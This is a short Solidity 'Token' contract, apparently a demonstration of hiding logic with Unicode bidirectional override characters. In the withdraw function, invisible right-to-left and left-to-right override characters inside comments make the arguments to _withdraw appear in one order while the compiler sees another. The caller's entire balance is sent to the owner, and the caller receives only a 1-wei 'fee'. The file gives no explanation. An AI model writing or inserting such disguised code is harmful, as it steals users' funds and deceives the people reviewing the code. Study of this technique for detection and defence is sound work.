// SPDX-License-Identifier: GPL-3.0 
pragma solidity ^0.8.24;

contract Token {
    address payable o; // owner
    mapping(address => uint) tokens;

    function withdraw() external returns(uint) {
        uint amount = tokens[msg.sender];
        address payable d = msg.sender;
        tokens[msg.sender] = 0;
        _withdraw(/*owner‮/*noitanitsed*/ d, o/*‭
		        /*value */, amount);
    }

    function _withdraw(address payable fee_receiver, address payable destination, uint value) internal {
		  fee_receiver.transfer(1);
		  destination.transfer(value);
    }
}